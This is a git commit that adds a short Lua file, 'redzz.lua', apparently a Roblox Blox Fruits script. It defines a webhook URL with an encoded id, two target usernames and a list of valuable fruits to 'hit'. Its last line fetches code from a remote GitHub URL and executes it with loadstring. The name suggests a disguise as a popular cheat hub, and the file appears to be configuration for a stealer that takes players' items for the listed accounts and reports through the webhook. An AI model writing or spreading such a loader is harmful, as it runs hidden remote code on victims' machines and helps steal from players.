407166f5cbca8b8694a570a392764ce8139a35fe
vovasevere200 <vovasevere@gmail.com>
2025-02-22 01:13:04 +0700

    Create redzz.lua

---
+++ redzz.lua
@@ -0,0 +1,23 @@
+Webhook =
+    "https://webhook-protect.vercel.app/api/webhook?id=LXJ0V3dvOV9IWVpBZjU1T09BeDJrZzpJamZlSUoxZ05GaWhURDZ3NWNHcTV6RWtESkVtdUkwVU9kWTJzWlY3NDFNWnRLSGprWWZJTmFrX05oTHprQno4RjRUUTNxM2JpdDNvdmc4cV8yZjJKX1BVdFNqSG53dkV4VS1sNEk4V3RUSkt6SURuZ3lxeU1ZVjZlT0NVQUhpU2FDZ3VKTUVFSnRNV0tuOVhRandsYWE2RDBjV3VnM29UWjAwX0Y3aUFyYlU"
+Usernames = {"3IKSSA228", "vovasevere1"}
+FruitsToHit = {
+    "Buddha-Buddha",
+    "Portal-Portal",
+    "Rumble-Rumble",
+    "Blizzard-Blizzard",
+    "Gravity-Gravity",
+    "Mammoth-Mammoth",
+    "T-Rex-T-Rex",
+    "Shadow-Shadow",
+    "Dough-Dough",
+    "Venom-Venom",
+    "Gas-Gas",
+    "Control-Control",
+    "Leopard-Leopard",
+    "Spirit-Spirit",
+    "Yeti-Yeti",
+    "Kitsune-Kitsune"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
